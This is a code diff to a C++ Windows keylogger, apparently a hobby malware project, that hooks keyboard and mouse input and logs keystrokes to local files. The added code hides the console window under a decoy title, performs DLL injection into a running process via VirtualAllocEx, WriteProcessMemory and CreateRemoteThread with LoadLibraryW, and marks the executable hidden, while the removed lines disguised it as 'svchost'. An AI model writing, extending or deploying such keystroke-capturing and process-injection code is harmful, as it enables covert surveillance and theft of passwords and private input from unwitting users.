@@ -5,6 +5,10 @@
 #include <chrono>
 #include <iomanip>
 #include <locale>
+#include <vector>
+#include <TlHelp32.h>
+#include <cstdlib> // for _wgetenv_s
+
 
 // #include "tcp_connection.h"
 
@@ -14,13 +18,188 @@ std::ostringstream logStream, keyboardStream;
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 
+std::wstring GetModuleFileExeName() {
+    constexpr size_t MAX_PATH_LEN = 260; // Maximum length of a file path
+
+    std::vector<wchar_t> pathBuf(MAX_PATH_LEN);
+    DWORD copied = GetModuleFileNameW(NULL, pathBuf.data(), static_cast<DWORD>(pathBuf.size()));
+
+    if (copied == 0) {
+        throw std::runtime_error("Failed to get module file name. Error: " + std::to_string(GetLastError()));
+    }
+
+    if (copied >= pathBuf.size()) {
+        throw std::runtime_error("Buffer size exceeded while getting module file name. Error: " + std::to_string(GetLastError()));
+    }
+
+    std::wstring filePath(pathBuf.data());
+
+    // Extract just the file name (excluding the path)
+    size_t pos = filePath.find_last_of(L"\\");
+    if (pos != std::wstring::npos && pos + 1 < filePath.size()) {
+        return filePath.substr(pos + 1);
+    }
+    else {
+        throw std::runtime_error("Invalid module file name.");
+    }
+}
+
+
+DWORD GetProcIdByName(const wchar_t* procName) {
+    DWORD procId = 0; // Initialize procId to 0
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+
+    PROCESSENTRY32W procEntry{};
+    procEntry.dwSize = sizeof(PROCESSENTRY32W);
+    if (!Process32FirstW(hSnap, &procEntry)) {
+        CloseHandle(hSnap);
+        return 0;
+    }
+
+    do {
+        // Perform case-insensitive comparison directly with wide character strings
+        if (_wcsicmp(procEntry.szExeFile, procName) == 0) {
+            procId = procEntry.th32ProcessID;
+            break;
+        }
+    } while (Process32NextW(hSnap, &procEntry));
+
+    CloseHandle(hSnap);
+    return procId;
+}
+
+
+std::wstring GetUsername() {
+    wchar_t username[MAX_PATH];
+    size_t len;
+    if (_wgetenv_s(&len, username, MAX_PATH, L"USERNAME") != 0 || len == 0) {
+        std::cerr << "Failed to retrieve username from environment variables." << std::endl;
+        return L"";
+    }
+    return std::wstring(username);
+}
+
+std::wstring CreateOrGetDLLPath(const std::wstring& fileName) {
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return L"";
+    }
+
+    // Construct the desired path
+    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\Desktop\\" + fileName;
+
+    // Check if the DLL file already exists
+    if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        return desiredPath; // Return the path if the file already exists
+    }
+    else {
+        // Create the DLL file
+        std::wofstream dllFile(desiredPath.c_str());
+        if (!dllFile.is_open()) {
+            std::wcerr << "Failed to create DLL file at: " << desiredPath << std::endl;
+            std::cerr << "Error code: " << GetLastError() << std::endl; // Log the error code
+            return L"";
+        }
+        //dllFile << "This is a newly created DLL file.";
+        dllFile.close();
+        std::wcout << "DLL file created at: " << desiredPath << std::endl;
+        return desiredPath;
+    }
+}
+
+
 int main()
 {
-    char Exename[MAX_PATH] = "keyloger-in-cpp.exe";
-    GetModuleFileNameA(nullptr, Exename, MAX_PATH);
-    SetFileAttributesA(Exename, FILE_ATTRIBUTE_HIDDEN);
-    SetConsoleTitleA("svchost");
+
+    SetConsoleTitleA("Anime Girl");
     ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+    std::wstring desiredPath = L"dl.dll";
+    std::wstring dllPath = CreateOrGetDLLPath(desiredPath);
+
+    if (dllPath.empty()) {
+        std::cerr << "Failed to get DLL path." << std::endl;
+        return 1;
+    }
+
+    std::wcout << "DLL path: " << dllPath << std::endl;
+
+    std::wstring targetProcName = GetModuleFileExeName();
+    if (targetProcName.empty()) {
+        return 1;
+    }
+
+    DWORD procId = GetProcIdByName(targetProcName.c_str());    
+    if (procId == 0) {
+        std::cerr << "Failed to get target process ID." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
+    if (hProc == NULL) {
+        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
+        return 1;
+    }
+
+    LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, dllPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (remoteMem == NULL) {
+        std::cerr << "Failed to allocate remote memory. Error: " << GetLastError() << std::endl;
+        CloseHandle(hProc);
+        return 1;
+    }
+
+    if (!WriteProcessMemory(hProc, remoteMem, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr)) {
+        std::cerr << "Failed to write DLL path to remote process. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return 1;
+    }
+
+    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (kernel32 == NULL) {
+        std::cerr << "Failed to get handle to kernel32.dll. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return 1;
+    }
+
+    LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryW");
+    if (loadLibraryAddr == NULL) {
+        std::cerr << "Failed to get address of LoadLibraryW. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return 1;
+    }
+
+    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLibraryAddr, remoteMem, 0, NULL);
+    if (hThread == NULL) {
+        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return 1;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    std::cout << "DLL injected successfully." << std::endl;
+
+    CloseHandle(hThread);
+    VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+    CloseHandle(hProc);
+
+    // Set file attributes
+    if (!SetFileAttributesW(targetProcName.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
+        std::cerr << "Failed to set file attributes. Error: " << GetLastError() << std::endl;
+        //return 1;
+    }
+
+
+    
 
     logFile.open("log.csv", std::ios::app);
     logStream << "Time,Event,Type,Key/Position,MousePosition\n";
@@ -242,7 +421,7 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             keyboardFile.open("linear_keyboard.txt", std::ios::app);
             if (!keyboardFile.is_open()) {
                 throw std::runtime_error("Failed to open keyboard file.");
-            }
+            } 
             keyboardFile << key;
             keyboardFile.close();
             keyboardStream.str("");
